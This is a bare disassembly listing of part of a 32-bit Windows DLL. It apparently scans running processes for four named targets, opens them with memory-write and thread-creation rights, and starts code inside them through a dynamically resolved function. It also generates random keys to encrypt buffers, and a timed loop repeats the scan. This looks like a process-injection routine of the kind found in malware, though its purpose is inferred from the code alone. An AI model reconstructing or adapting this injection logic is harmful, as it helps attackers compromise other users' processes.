1000d760:	53                   	push   %ebx
1000d761:	e8 6f ff ff ff       	call   0x1000d6d5
1000d766:	59                   	pop    %ecx
1000d767:	57                   	push   %edi
1000d768:	57                   	push   %edi
1000d769:	56                   	push   %esi
1000d76a:	56                   	push   %esi
1000d76b:	57                   	push   %edi
1000d76c:	57                   	push   %edi
1000d76d:	ff 75 08             	pushl  0x8(%ebp)
1000d770:	89 7c 24 28          	mov    %edi,0x28(%esp)
1000d774:	ff 15 f0 e0 00 10    	call   *0x1000e0f0
1000d77a:	89 44 24 0c          	mov    %eax,0xc(%esp)
1000d77e:	3b c7                	cmp    %edi,%eax
1000d780:	75 22                	jne    0x1000d7a4
1000d782:	8d 44 24 18          	lea    0x18(%esp),%eax
1000d786:	50                   	push   %eax
1000d787:	8d 44 24 10          	lea    0x10(%esp),%eax
1000d78b:	50                   	push   %eax
1000d78c:	56                   	push   %esi
1000d78d:	56                   	push   %esi
1000d78e:	57                   	push   %edi
1000d78f:	57                   	push   %edi
1000d790:	57                   	push   %edi
1000d791:	57                   	push   %edi
1000d792:	57                   	push   %edi
1000d793:	ff 75 08             	pushl  0x8(%ebp)
1000d796:	ff 15 60 38 01 10    	call   *0x10013860
1000d79c:	85 c0                	test   %eax,%eax
1000d79e:	74 04                	je     0x1000d7a4
1000d7a0:	89 7c 24 0c          	mov    %edi,0xc(%esp)
1000d7a4:	6a 10                	push   $0x10
1000d7a6:	ff 15 44 e1 00 10    	call   *0x1000e144
1000d7ac:	8d 44 24 20          	lea    0x20(%esp),%eax
1000d7b0:	50                   	push   %eax
1000d7b1:	ff 75 14             	pushl  0x14(%ebp)
1000d7b4:	ff 75 10             	pushl  0x10(%ebp)
1000d7b7:	ff 74 24 1c          	pushl  0x1c(%esp)
1000d7bb:	e8 2b fe ff ff       	call   0x1000d5eb
1000d7c0:	8b 44 24 20          	mov    0x20(%esp),%eax
1000d7c4:	83 c4 10             	add    $0x10,%esp
1000d7c7:	e8 e0 fe ff ff       	call   0x1000d6ac
1000d7cc:	ff 75 10             	pushl  0x10(%ebp)
1000d7cf:	89 18                	mov    %ebx,(%eax)
1000d7d1:	56                   	push   %esi
1000d7d2:	ff 75 08             	pushl  0x8(%ebp)
1000d7d5:	ff 15 f4 e0 00 10    	call   *0x1000e0f4
1000d7db:	39 7c 24 0c          	cmp    %edi,0xc(%esp)
1000d7df:	74 3f                	je     0x1000d820
1000d7e1:	68 64 19 00 00       	push   $0x1964
1000d7e6:	ff 74 24 10          	pushl  0x10(%esp)
1000d7ea:	ff 15 38 e1 00 10    	call   *0x1000e138
1000d7f0:	85 c0                	test   %eax,%eax
1000d7f2:	74 0b                	je     0x1000d7ff
1000d7f4:	57                   	push   %edi
1000d7f5:	ff 74 24 10          	pushl  0x10(%esp)
1000d7f9:	ff 15 6c e1 00 10    	call   *0x1000e16c
1000d7ff:	ff 74 24 10          	pushl  0x10(%esp)
1000d803:	ff 74 24 18          	pushl  0x18(%esp)
1000d807:	56                   	push   %esi
1000d808:	ff 75 08             	pushl  0x8(%ebp)
1000d80b:	e8 79 fe ff ff       	call   0x1000d689
1000d810:	83 c4 10             	add    $0x10,%esp
1000d813:	ff 74 24 0c          	pushl  0xc(%esp)
1000d817:	33 ff                	xor    %edi,%edi
1000d819:	47                   	inc    %edi
1000d81a:	ff 15 50 e1 00 10    	call   *0x1000e150
1000d820:	8b c7                	mov    %edi,%eax
1000d822:	5f                   	pop    %edi
1000d823:	5e                   	pop    %esi
1000d824:	5b                   	pop    %ebx
1000d825:	8b e5                	mov    %ebp,%esp
1000d827:	5d                   	pop    %ebp
1000d828:	c3                   	ret    
1000d829:	55                   	push   %ebp
1000d82a:	8b ec                	mov    %esp,%ebp
1000d82c:	8b 48 50             	mov    0x50(%eax),%ecx
1000d82f:	85 c9                	test   %ecx,%ecx
1000d831:	75 04                	jne    0x1000d837
1000d833:	33 c0                	xor    %eax,%eax
1000d835:	eb 17                	jmp    0x1000d84e
1000d837:	8d 50 24             	lea    0x24(%eax),%edx
1000d83a:	52                   	push   %edx
1000d83b:	8d 50 04             	lea    0x4(%eax),%edx
1000d83e:	52                   	push   %edx
1000d83f:	51                   	push   %ecx
1000d840:	ff 70 4c             	pushl  0x4c(%eax)
1000d843:	ff 75 08             	pushl  0x8(%ebp)
1000d846:	e8 a8 fe ff ff       	call   0x1000d6f3
1000d84b:	83 c4 14             	add    $0x14,%esp
1000d84e:	5d                   	pop    %ebp
1000d84f:	c2 04 00             	ret    $0x4
1000d852:	55                   	push   %ebp
1000d853:	8b ec                	mov    %esp,%ebp
1000d855:	51                   	push   %ecx
1000d856:	ff 75 08             	pushl  0x8(%ebp)
1000d859:	e8 cb ff ff ff       	call   0x1000d829
1000d85e:	59                   	pop    %ecx
1000d85f:	5d                   	pop    %ebp
1000d860:	c2 04 00             	ret    $0x4
1000d863:	33 c0                	xor    %eax,%eax
1000d865:	c3                   	ret    
1000d866:	55                   	push   %ebp
1000d867:	8b ec                	mov    %esp,%ebp
1000d869:	51                   	push   %ecx
1000d86a:	53                   	push   %ebx
1000d86b:	56                   	push   %esi
1000d86c:	57                   	push   %edi
1000d86d:	e8 f1 ff ff ff       	call   0x1000d863
1000d872:	8b f0                	mov    %eax,%esi
1000d874:	33 ff                	xor    %edi,%edi
1000d876:	85 f6                	test   %esi,%esi
1000d878:	75 16                	jne    0x1000d890
1000d87a:	ff 75 0c             	pushl  0xc(%ebp)
1000d87d:	57                   	push   %edi
1000d87e:	68 3a 04 00 00       	push   $0x43a
1000d883:	ff 15 80 e0 00 10    	call   *0x1000e080
1000d889:	8b f0                	mov    %eax,%esi
1000d88b:	47                   	inc    %edi
1000d88c:	85 f6                	test   %esi,%esi
1000d88e:	74 18                	je     0x1000d8a8
1000d890:	8b 45 08             	mov    0x8(%ebp),%eax
1000d893:	56                   	push   %esi
1000d894:	e8 b9 ff ff ff       	call   0x1000d852
1000d899:	8b d8                	mov    %eax,%ebx
1000d89b:	85 ff                	test   %edi,%edi
1000d89d:	74 07                	je     0x1000d8a6
1000d89f:	56                   	push   %esi
1000d8a0:	ff 15 50 e1 00 10    	call   *0x1000e150
1000d8a6:	8b c3                	mov    %ebx,%eax
1000d8a8:	5f                   	pop    %edi
1000d8a9:	5e                   	pop    %esi
1000d8aa:	5b                   	pop    %ebx
1000d8ab:	59                   	pop    %ecx
1000d8ac:	5d                   	pop    %ebp
1000d8ad:	c2 08 00             	ret    $0x8
1000d8b0:	55                   	push   %ebp
1000d8b1:	8b ec                	mov    %esp,%ebp
1000d8b3:	ff 75 0c             	pushl  0xc(%ebp)
1000d8b6:	e8 92 fc ff ff       	call   0x1000d54d
1000d8bb:	59                   	pop    %ecx
1000d8bc:	85 c0                	test   %eax,%eax
1000d8be:	74 13                	je     0x1000d8d3
1000d8c0:	8b 45 08             	mov    0x8(%ebp),%eax
1000d8c3:	ff 75 0c             	pushl  0xc(%ebp)
1000d8c6:	8b 08                	mov    (%eax),%ecx
1000d8c8:	e8 16 fc ff ff       	call   0x1000d4e3
1000d8cd:	f7 d8                	neg    %eax
1000d8cf:	1b c0                	sbb    %eax,%eax
1000d8d1:	59                   	pop    %ecx
1000d8d2:	40                   	inc    %eax
1000d8d3:	5d                   	pop    %ebp
1000d8d4:	c2 08 00             	ret    $0x8
1000d8d7:	55                   	push   %ebp
1000d8d8:	8b ec                	mov    %esp,%ebp
1000d8da:	ff 75 08             	pushl  0x8(%ebp)
1000d8dd:	8b 00                	mov    (%eax),%eax
1000d8df:	e8 51 fc ff ff       	call   0x1000d535
1000d8e4:	59                   	pop    %ecx
1000d8e5:	5d                   	pop    %ebp
1000d8e6:	c2 04 00             	ret    $0x4
1000d8e9:	8b 07                	mov    (%edi),%eax
1000d8eb:	83 38 00             	cmpl   $0x0,(%eax)
1000d8ee:	74 29                	je     0x1000d919
1000d8f0:	56                   	push   %esi
1000d8f1:	33 f6                	xor    %esi,%esi
1000d8f3:	ff 34 06             	pushl  (%esi,%eax,1)
1000d8f6:	e8 52 fc ff ff       	call   0x1000d54d
1000d8fb:	59                   	pop    %ecx
1000d8fc:	85 c0                	test   %eax,%eax
1000d8fe:	75 0d                	jne    0x1000d90d
1000d900:	8b 17                	mov    (%edi),%edx
1000d902:	ff 34 16             	pushl  (%esi,%edx,1)
1000d905:	e8 10 fc ff ff       	call   0x1000d51a
1000d90a:	59                   	pop    %ecx
1000d90b:	eb 03                	jmp    0x1000d910
1000d90d:	83 c6 04             	add    $0x4,%esi
1000d910:	8b 07                	mov    (%edi),%eax
1000d912:	83 3c 06 00          	cmpl   $0x0,(%esi,%eax,1)
1000d916:	75 db                	jne    0x1000d8f3
1000d918:	5e                   	pop    %esi
1000d919:	c3                   	ret    
1000d91a:	55                   	push   %ebp
1000d91b:	8b ec                	mov    %esp,%ebp
1000d91d:	51                   	push   %ecx
1000d91e:	51                   	push   %ecx
1000d91f:	56                   	push   %esi
1000d920:	8b 35 90 e1 00 10    	mov    0x1000e190,%esi
1000d926:	68 c0 f6 00 10       	push   $0x1000f6c0
1000d92b:	57                   	push   %edi
1000d92c:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
1000d933:	ff d6                	call   *%esi
1000d935:	85 c0                	test   %eax,%eax
1000d937:	75 24                	jne    0x1000d95d
1000d939:	68 d8 f6 00 10       	push   $0x1000f6d8
1000d93e:	57                   	push   %edi
1000d93f:	ff d6                	call   *%esi
1000d941:	85 c0                	test   %eax,%eax
1000d943:	75 18                	jne    0x1000d95d
1000d945:	68 f0 f6 00 10       	push   $0x1000f6f0
1000d94a:	57                   	push   %edi
1000d94b:	ff d6                	call   *%esi
1000d94d:	85 c0                	test   %eax,%eax
1000d94f:	75 0c                	jne    0x1000d95d
1000d951:	68 0c f7 00 10       	push   $0x1000f70c
1000d956:	57                   	push   %edi
1000d957:	ff d6                	call   *%esi
1000d959:	85 c0                	test   %eax,%eax
1000d95b:	74 39                	je     0x1000d996
1000d95d:	8b c3                	mov    %ebx,%eax
1000d95f:	e8 66 fb ff ff       	call   0x1000d4ca
1000d964:	85 c0                	test   %eax,%eax
1000d966:	74 2e                	je     0x1000d996
1000d968:	ff 75 08             	pushl  0x8(%ebp)
1000d96b:	53                   	push   %ebx
1000d96c:	e8 3f ff ff ff       	call   0x1000d8b0
1000d971:	85 c0                	test   %eax,%eax
1000d973:	74 1a                	je     0x1000d98f
1000d975:	ff 75 08             	pushl  0x8(%ebp)
1000d978:	53                   	push   %ebx
1000d979:	e8 e8 fe ff ff       	call   0x1000d866
1000d97e:	89 45 fc             	mov    %eax,-0x4(%ebp)
1000d981:	85 c0                	test   %eax,%eax
1000d983:	74 0a                	je     0x1000d98f
1000d985:	ff 75 08             	pushl  0x8(%ebp)
1000d988:	8b c3                	mov    %ebx,%eax
1000d98a:	e8 48 ff ff ff       	call   0x1000d8d7
1000d98f:	8b c3                	mov    %ebx,%eax
1000d991:	e8 42 fb ff ff       	call   0x1000d4d8
1000d996:	8b 45 fc             	mov    -0x4(%ebp),%eax
1000d999:	5e                   	pop    %esi
1000d99a:	c9                   	leave  
1000d99b:	c2 04 00             	ret    $0x4
1000d99e:	55                   	push   %ebp
1000d99f:	8b ec                	mov    %esp,%ebp
1000d9a1:	81 ec 40 02 00 00    	sub    $0x240,%esp
1000d9a7:	53                   	push   %ebx
1000d9a8:	57                   	push   %edi
1000d9a9:	8d 7e 04             	lea    0x4(%esi),%edi
1000d9ac:	57                   	push   %edi
1000d9ad:	8d 85 d8 fe ff ff    	lea    -0x128(%ebp),%eax
1000d9b3:	e8 ea b4 ff ff       	call   0x10008ea2
1000d9b8:	6a 10                	push   $0x10
1000d9ba:	8d 5e 24             	lea    0x24(%esi),%ebx
1000d9bd:	8d 45 f0             	lea    -0x10(%ebp),%eax
1000d9c0:	53                   	push   %ebx
1000d9c1:	50                   	push   %eax
1000d9c2:	e8 49 03 00 00       	call   0x1000dd10
1000d9c7:	8b 46 4c             	mov    0x4c(%esi),%eax
1000d9ca:	8b 4e 50             	mov    0x50(%esi),%ecx
1000d9cd:	50                   	push   %eax
1000d9ce:	50                   	push   %eax
1000d9cf:	8d 45 f0             	lea    -0x10(%ebp),%eax
1000d9d2:	50                   	push   %eax
1000d9d3:	8d 85 d8 fe ff ff    	lea    -0x128(%ebp),%eax
1000d9d9:	6a 01                	push   $0x1
1000d9db:	50                   	push   %eax
1000d9dc:	e8 25 c1 ff ff       	call   0x10009b06
1000d9e1:	57                   	push   %edi
1000d9e2:	8d 85 c0 fd ff ff    	lea    -0x240(%ebp),%eax
1000d9e8:	e8 b5 b4 ff ff       	call   0x10008ea2
1000d9ed:	6a 10                	push   $0x10
1000d9ef:	8d 45 f0             	lea    -0x10(%ebp),%eax
1000d9f2:	53                   	push   %ebx
1000d9f3:	50                   	push   %eax
1000d9f4:	e8 17 03 00 00       	call   0x1000dd10
1000d9f9:	8b 46 54             	mov    0x54(%esi),%eax
1000d9fc:	8b 4e 58             	mov    0x58(%esi),%ecx
1000d9ff:	50                   	push   %eax
1000da00:	50                   	push   %eax
1000da01:	8d 45 f0             	lea    -0x10(%ebp),%eax
1000da04:	50                   	push   %eax
1000da05:	8d 85 c0 fd ff ff    	lea    -0x240(%ebp),%eax
1000da0b:	6a 01                	push   $0x1
1000da0d:	50                   	push   %eax
1000da0e:	e8 f3 c0 ff ff       	call   0x10009b06
1000da13:	83 c4 48             	add    $0x48,%esp
1000da16:	33 c0                	xor    %eax,%eax
1000da18:	5f                   	pop    %edi
1000da19:	40                   	inc    %eax
1000da1a:	5b                   	pop    %ebx
1000da1b:	c9                   	leave  
1000da1c:	c3                   	ret    
1000da1d:	55                   	push   %ebp
1000da1e:	8b ec                	mov    %esp,%ebp
1000da20:	51                   	push   %ecx
1000da21:	53                   	push   %ebx
1000da22:	56                   	push   %esi
1000da23:	57                   	push   %edi
1000da24:	8b f1                	mov    %ecx,%esi
1000da26:	8d 7e 34             	lea    0x34(%esi),%edi
1000da29:	57                   	push   %edi
1000da2a:	8b d8                	mov    %eax,%ebx
1000da2c:	ff 15 5c e1 00 10    	call   *0x1000e15c
1000da32:	68 00 20 00 00       	push   $0x2000
1000da37:	e8 a8 8f ff ff       	call   0x100069e4
1000da3c:	59                   	pop    %ecx
1000da3d:	89 06                	mov    %eax,(%esi)
1000da3f:	85 c0                	test   %eax,%eax
1000da41:	75 0e                	jne    0x1000da51
1000da43:	57                   	push   %edi
1000da44:	ff 15 68 e1 00 10    	call   *0x1000e168
1000da4a:	33 c0                	xor    %eax,%eax
1000da4c:	e9 5b 01 00 00       	jmp    0x1000dbac
1000da51:	ff 75 10             	pushl  0x10(%ebp)
1000da54:	e8 8b 8f ff ff       	call   0x100069e4
1000da59:	8b f8                	mov    %eax,%edi
1000da5b:	59                   	pop    %ecx
1000da5c:	85 ff                	test   %edi,%edi
1000da5e:	74 ea                	je     0x1000da4a
1000da60:	8b 45 10             	mov    0x10(%ebp),%eax
1000da63:	c1 e0 02             	shl    $0x2,%eax
1000da66:	50                   	push   %eax
1000da67:	89 46 50             	mov    %eax,0x50(%esi)
1000da6a:	e8 75 8f ff ff       	call   0x100069e4
1000da6f:	59                   	pop    %ecx
1000da70:	89 46 4c             	mov    %eax,0x4c(%esi)
1000da73:	85 c0                	test   %eax,%eax
1000da75:	75 09                	jne    0x1000da80
1000da77:	57                   	push   %edi
1000da78:	e8 96 8f ff ff       	call   0x10006a13
1000da7d:	59                   	pop    %ecx
1000da7e:	eb ca                	jmp    0x1000da4a
1000da80:	ff 75 10             	pushl  0x10(%ebp)
1000da83:	ff 75 0c             	pushl  0xc(%ebp)
1000da86:	57                   	push   %edi
1000da87:	e8 84 02 00 00       	call   0x1000dd10
1000da8c:	83 c4 0c             	add    $0xc,%esp
1000da8f:	ff 75 08             	pushl  0x8(%ebp)
1000da92:	ff 75 10             	pushl  0x10(%ebp)
1000da95:	57                   	push   %edi
1000da96:	e8 80 81 ff ff       	call   0x10005c1b
1000da9b:	8b 46 50             	mov    0x50(%esi),%eax
1000da9e:	89 45 0c             	mov    %eax,0xc(%ebp)
1000daa1:	83 c4 0c             	add    $0xc,%esp
1000daa4:	8d 45 0c             	lea    0xc(%ebp),%eax
1000daa7:	50                   	push   %eax
1000daa8:	ff 76 4c             	pushl  0x4c(%esi)
1000daab:	8b 45 10             	mov    0x10(%ebp),%eax
1000daae:	57                   	push   %edi
1000daaf:	e8 3c c9 ff ff       	call   0x1000a3f0
1000dab4:	83 c4 0c             	add    $0xc,%esp
1000dab7:	85 c0                	test   %eax,%eax
1000dab9:	74 0c                	je     0x1000dac7
1000dabb:	57                   	push   %edi
1000dabc:	e8 52 8f ff ff       	call   0x10006a13
1000dac1:	59                   	pop    %ecx
1000dac2:	ff 76 4c             	pushl  0x4c(%esi)
1000dac5:	eb b1                	jmp    0x1000da78
1000dac7:	8b 45 0c             	mov    0xc(%ebp),%eax
1000daca:	53                   	push   %ebx
1000dacb:	ff 75 14             	pushl  0x14(%ebp)
1000dace:	89 46 50             	mov    %eax,0x50(%esi)
1000dad1:	57                   	push   %edi
1000dad2:	e8 39 02 00 00       	call   0x1000dd10
1000dad7:	83 c4 0c             	add    $0xc,%esp
1000dada:	ff 75 08             	pushl  0x8(%ebp)
1000dadd:	53                   	push   %ebx
1000dade:	57                   	push   %edi
1000dadf:	e8 37 81 ff ff       	call   0x10005c1b
1000dae4:	8b c3                	mov    %ebx,%eax
1000dae6:	c1 e0 02             	shl    $0x2,%eax
1000dae9:	83 c4 0c             	add    $0xc,%esp
1000daec:	50                   	push   %eax
1000daed:	89 46 58             	mov    %eax,0x58(%esi)
1000daf0:	e8 ef 8e ff ff       	call   0x100069e4
1000daf5:	59                   	pop    %ecx
1000daf6:	89 46 54             	mov    %eax,0x54(%esi)
1000daf9:	85 c0                	test   %eax,%eax
1000dafb:	74 be                	je     0x1000dabb
1000dafd:	8b 4e 58             	mov    0x58(%esi),%ecx
1000db00:	89 4d 0c             	mov    %ecx,0xc(%ebp)
1000db03:	8d 4d 0c             	lea    0xc(%ebp),%ecx
1000db06:	51                   	push   %ecx
1000db07:	50                   	push   %eax
1000db08:	57                   	push   %edi
1000db09:	8b c3                	mov    %ebx,%eax
1000db0b:	e8 e0 c8 ff ff       	call   0x1000a3f0
1000db10:	8b 45 0c             	mov    0xc(%ebp),%eax
1000db13:	83 c4 0c             	add    $0xc,%esp
1000db16:	57                   	push   %edi
1000db17:	89 46 58             	mov    %eax,0x58(%esi)
1000db1a:	e8 f4 8e ff ff       	call   0x10006a13
1000db1f:	59                   	pop    %ecx
1000db20:	33 ff                	xor    %edi,%edi
1000db22:	e8 bf 76 ff ff       	call   0x100051e6
1000db27:	88 44 3e 04          	mov    %al,0x4(%esi,%edi,1)
1000db2b:	47                   	inc    %edi
1000db2c:	83 ff 20             	cmp    $0x20,%edi
1000db2f:	72 f1                	jb     0x1000db22
1000db31:	33 ff                	xor    %edi,%edi
1000db33:	e8 ae 76 ff ff       	call   0x100051e6
1000db38:	88 44 3e 24          	mov    %al,0x24(%esi,%edi,1)
1000db3c:	47                   	inc    %edi
1000db3d:	83 ff 10             	cmp    $0x10,%edi
1000db40:	72 f1                	jb     0x1000db33
1000db42:	e8 57 fe ff ff       	call   0x1000d99e
1000db47:	85 c0                	test   %eax,%eax
1000db49:	75 08                	jne    0x1000db53
1000db4b:	ff 76 54             	pushl  0x54(%esi)
1000db4e:	e9 69 ff ff ff       	jmp    0x1000dabc
1000db53:	8b 3d 04 e1 00 10    	mov    0x1000e104,%edi
1000db59:	68 28 f7 00 10       	push   $0x1000f728
1000db5e:	68 40 e7 00 10       	push   $0x1000e740
1000db63:	ff d7                	call   *%edi
1000db65:	8b 1d 68 e0 00 10    	mov    0x1000e068,%ebx
1000db6b:	50                   	push   %eax
1000db6c:	ff d3                	call   *%ebx
1000db6e:	68 3c f7 00 10       	push   $0x1000f73c
1000db73:	68 40 e7 00 10       	push   $0x1000e740
1000db78:	a3 60 38 01 10       	mov    %eax,0x10013860
1000db7d:	ff d7                	call   *%edi
1000db7f:	50                   	push   %eax
1000db80:	ff d3                	call   *%ebx
1000db82:	68 50 f7 00 10       	push   $0x1000f750
1000db87:	68 40 e7 00 10       	push   $0x1000e740
1000db8c:	a3 68 38 01 10       	mov    %eax,0x10013868
1000db91:	ff d7                	call   *%edi
1000db93:	50                   	push   %eax
1000db94:	ff d3                	call   *%ebx
1000db96:	a3 64 38 01 10       	mov    %eax,0x10013864
1000db9b:	ff 15 98 e0 00 10    	call   *0x1000e098
1000dba1:	50                   	push   %eax
1000dba2:	8b c6                	mov    %esi,%eax
1000dba4:	e8 2e fd ff ff       	call   0x1000d8d7
1000dba9:	33 c0                	xor    %eax,%eax
1000dbab:	40                   	inc    %eax
1000dbac:	5f                   	pop    %edi
1000dbad:	5e                   	pop    %esi
1000dbae:	5b                   	pop    %ebx
1000dbaf:	59                   	pop    %ecx
1000dbb0:	5d                   	pop    %ebp
1000dbb1:	c2 10 00             	ret    $0x10
1000dbb4:	55                   	push   %ebp
1000dbb5:	8b ec                	mov    %esp,%ebp
1000dbb7:	81 ec 2c 02 00 00    	sub    $0x22c,%esp
1000dbbd:	53                   	push   %ebx
1000dbbe:	56                   	push   %esi
1000dbbf:	8b d8                	mov    %eax,%ebx
1000dbc1:	57                   	push   %edi
1000dbc2:	8b fb                	mov    %ebx,%edi
1000dbc4:	e8 20 fd ff ff       	call   0x1000d8e9
1000dbc9:	6a 00                	push   $0x0
1000dbcb:	6a 02                	push   $0x2
1000dbcd:	ff 15 94 e0 00 10    	call   *0x1000e094
1000dbd3:	8b f0                	mov    %eax,%esi
1000dbd5:	8d 85 d4 fd ff ff    	lea    -0x22c(%ebp),%eax
1000dbdb:	50                   	push   %eax
1000dbdc:	56                   	push   %esi
1000dbdd:	c7 85 d4 fd ff ff 2c 	movl   $0x22c,-0x22c(%ebp)
1000dbe4:	02 00 00 
1000dbe7:	ff 15 60 e0 00 10    	call   *0x1000e060
1000dbed:	eb 1f                	jmp    0x1000dc0e
1000dbef:	ff b5 dc fd ff ff    	pushl  -0x224(%ebp)
1000dbf5:	8d bd f8 fd ff ff    	lea    -0x208(%ebp),%edi
1000dbfb:	e8 1a fd ff ff       	call   0x1000d91a
1000dc00:	8d 85 d4 fd ff ff    	lea    -0x22c(%ebp),%eax
1000dc06:	50                   	push   %eax
1000dc07:	56                   	push   %esi
1000dc08:	ff 15 8c e0 00 10    	call   *0x1000e08c
1000dc0e:	85 c0                	test   %eax,%eax
1000dc10:	75 dd                	jne    0x1000dbef
1000dc12:	83 fe ff             	cmp    $0xffffffff,%esi
1000dc15:	74 07                	je     0x1000dc1e
1000dc17:	56                   	push   %esi
1000dc18:	ff 15 50 e1 00 10    	call   *0x1000e150
1000dc1e:	5f                   	pop    %edi
1000dc1f:	5e                   	pop    %esi
1000dc20:	5b                   	pop    %ebx
1000dc21:	c9                   	leave  
1000dc22:	c3                   	ret    
1000dc23:	68 34 38 01 10       	push   $0x10013834
1000dc28:	ff 15 68 e1 00 10    	call   *0x1000e168
1000dc2e:	c3                   	ret    
1000dc2f:	55                   	push   %ebp
1000dc30:	8b ec                	mov    %esp,%ebp
1000dc32:	8b 45 08             	mov    0x8(%ebp),%eax
1000dc35:	e8 7a ff ff ff       	call   0x1000dbb4
1000dc3a:	68 4d 01 00 00       	push   $0x14d
1000dc3f:	ff 15 44 e1 00 10    	call   *0x1000e144
1000dc45:	eb eb                	jmp    0x1000dc32
1000dc47:	33 c0                	xor    %eax,%eax
1000dc49:	50                   	push   %eax
1000dc4a:	50                   	push   %eax
1000dc4b:	56                   	push   %esi
1000dc4c:	68 2f dc 00 10       	push   $0x1000dc2f
1000dc51:	50                   	push   %eax
1000dc52:	50                   	push   %eax
1000dc53:	ff 15 54 e1 00 10    	call   *0x1000e154
1000dc59:	89 46 5c             	mov    %eax,0x5c(%esi)
1000dc5c:	c3                   	ret    
1000dc5d:	55                   	push   %ebp
1000dc5e:	8b ec                	mov    %esp,%ebp
1000dc60:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
1000dc64:	6a 01                	push   $0x1
1000dc66:	ff 75 0c             	pushl  0xc(%ebp)
1000dc69:	68 68 f7 00 10       	push   $0x1000f768
1000dc6e:	74 07                	je     0x1000dc77
1000dc70:	e8 7f 7c ff ff       	call   0x100058f4
1000dc75:	eb 05                	jmp    0x1000dc7c
1000dc77:	e8 50 7c ff ff       	call   0x100058cc
1000dc7c:	83 c4 0c             	add    $0xc,%esp
1000dc7f:	5d                   	pop    %ebp
1000dc80:	c2 08 00             	ret    $0x8
1000dc83:	55                   	push   %ebp
1000dc84:	8b ec                	mov    %esp,%ebp
1000dc86:	83 e4 f8             	and    $0xfffffff8,%esp
1000dc89:	83 ec 10             	sub    $0x10,%esp
1000dc8c:	53                   	push   %ebx
1000dc8d:	57                   	push   %edi
1000dc8e:	8b c6                	mov    %esi,%eax
1000dc90:	33 db                	xor    %ebx,%ebx
1000dc92:	e8 33 f8 ff ff       	call   0x1000d4ca
1000dc97:	85 c0                	test   %eax,%eax
1000dc99:	74 6b                	je     0x1000dd06
1000dc9b:	8d 44 24 08          	lea    0x8(%esp),%eax
1000dc9f:	50                   	push   %eax
1000dca0:	ff 75 08             	pushl  0x8(%ebp)
1000dca3:	e8 b5 ff ff ff       	call   0x1000dc5d
1000dca8:	85 c0                	test   %eax,%eax
1000dcaa:	74 53                	je     0x1000dcff
1000dcac:	8d 46 24             	lea    0x24(%esi),%eax
1000dcaf:	50                   	push   %eax
1000dcb0:	8d 46 04             	lea    0x4(%esi),%eax
1000dcb3:	50                   	push   %eax
1000dcb4:	ff 76 58             	pushl  0x58(%esi)
1000dcb7:	ff 76 54             	pushl  0x54(%esi)
1000dcba:	ff 74 24 18          	pushl  0x18(%esp)
1000dcbe:	e8 30 fa ff ff       	call   0x1000d6f3
1000dcc3:	83 c4 14             	add    $0x14,%esp
1000dcc6:	ff 74 24 10          	pushl  0x10(%esp)
1000dcca:	8b d8                	mov    %eax,%ebx
1000dccc:	8b c6                	mov    %esi,%eax
1000dcce:	e8 04 fc ff ff       	call   0x1000d8d7
1000dcd3:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
1000dcd7:	74 14                	je     0x1000dced
1000dcd9:	6a 10                	push   $0x10
1000dcdb:	8d 44 24 0c          	lea    0xc(%esp),%eax
1000dcdf:	50                   	push   %eax
1000dce0:	ff 75 0c             	pushl  0xc(%ebp)
1000dce3:	e8 28 00 00 00       	call   0x1000dd10
1000dce8:	83 c4 0c             	add    $0xc,%esp
1000dceb:	eb 12                	jmp    0x1000dcff
1000dced:	ff 74 24 08          	pushl  0x8(%esp)
1000dcf1:	8b 3d 50 e1 00 10    	mov    0x1000e150,%edi
1000dcf7:	ff d7                	call   *%edi
1000dcf9:	ff 74 24 0c          	pushl  0xc(%esp)
1000dcfd:	ff d7                	call   *%edi
1000dcff:	8b c6                	mov    %esi,%eax
1000dd01:	e8 d2 f7 ff ff       	call   0x1000d4d8
1000dd06:	5f                   	pop    %edi
1000dd07:	8b c3                	mov    %ebx,%eax
1000dd09:	5b                   	pop    %ebx
1000dd0a:	8b e5                	mov    %ebp,%esp
1000dd0c:	5d                   	pop    %ebp
1000dd0d:	c2 08 00             	ret    $0x8
1000dd10:	55                   	push   %ebp
1000dd11:	8b ec                	mov    %esp,%ebp
1000dd13:	57                   	push   %edi
1000dd14:	56                   	push   %esi
1000dd15:	51                   	push   %ecx
1000dd16:	8b 4d 10             	mov    0x10(%ebp),%ecx
1000dd19:	85 c9                	test   %ecx,%ecx
1000dd1b:	74 08                	je     0x1000dd25
1000dd1d:	8b 7d 08             	mov    0x8(%ebp),%edi
1000dd20:	8b 75 0c             	mov    0xc(%ebp),%esi
1000dd23:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
1000dd25:	59                   	pop    %ecx
1000dd26:	5e                   	pop    %esi
1000dd27:	5f                   	pop    %edi
1000dd28:	c9                   	leave  
1000dd29:	c3                   	ret    
1000dd2a:	55                   	push   %ebp
1000dd2b:	8b ec                	mov    %esp,%ebp
1000dd2d:	57                   	push   %edi
1000dd2e:	51                   	push   %ecx
1000dd2f:	50                   	push   %eax
1000dd30:	8b 4d 10             	mov    0x10(%ebp),%ecx
1000dd33:	85 c9                	test   %ecx,%ecx
1000dd35:	74 08                	je     0x1000dd3f
1000dd37:	8b 45 0c             	mov    0xc(%ebp),%eax
1000dd3a:	8b 7d 08             	mov    0x8(%ebp),%edi
1000dd3d:	f3 aa                	rep stos %al,%es:(%edi)
1000dd3f:	58                   	pop    %eax
1000dd40:	59                   	pop    %ecx
1000dd41:	5f                   	pop    %edi
1000dd42:	c9                   	leave  
1000dd43:	c3                   	ret    
